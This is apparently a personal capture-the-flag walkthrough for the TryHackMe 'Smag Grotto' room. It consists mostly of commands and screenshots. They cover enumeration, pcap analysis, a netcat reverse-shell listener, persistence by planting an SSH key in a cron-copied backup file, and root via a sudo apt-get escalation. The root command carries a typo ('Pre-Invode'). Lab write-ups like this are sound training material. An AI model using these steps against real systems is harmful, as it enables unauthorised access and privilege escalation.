---
description: https://tryhackme.com/room/smaggrotto
---

# Smag Grotto

### **What is the user flag?**

```
nmap 10.10.199.227
gobuster dir -u http://10.10.199.227/ \
             -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -t64
```

![](<../../.gitbook/assets/Screenshot from 2020-09-23 09-25-44.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-23 09-25-48.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-23 09-32-26.png>)

```
wget http://10.10.199.227/aW1wb3J0YW50/dHJhY2Uy.pcap
wireshark dHJhY2Uy.pcap
```

![](<../../.gitbook/assets/Screenshot from 2020-09-23 09-30-11.png>)

```
echo '10.10.199.227 development.smag.thm' | sudo tee -a /etc/hosts
nc -nvlp 4444
$ find /home -name user.txt 2>/dev/null
$ cat /home/jake/user.txt
$ cat /etc/crontab
```

![](<../../.gitbook/assets/Screenshot from 2020-09-23 09-48-15.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-23 09-57-17.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-23 09-46-49.png>)

```
ssh-keygen
cat .ssh/id_rsa
```

```
$ echo 'ssh-rsa xxx kali@kali' > /opt/.backups/jake_id_rsa.pub.backup
```

```
ssh jake@10.10.199.227 cat user.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-23 09-58-35.png>)

### **What is the root flag?**

```
sudo -l
sudo apt-get update -o APT::Update:Pre-Invode::=/bin/sh
# cat /root/root.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-23 10-02-58.png>)

## :link: Support Material

{% embed url="https://gtfobins.github.io/gtfobins/apt-get/#sudo" %}
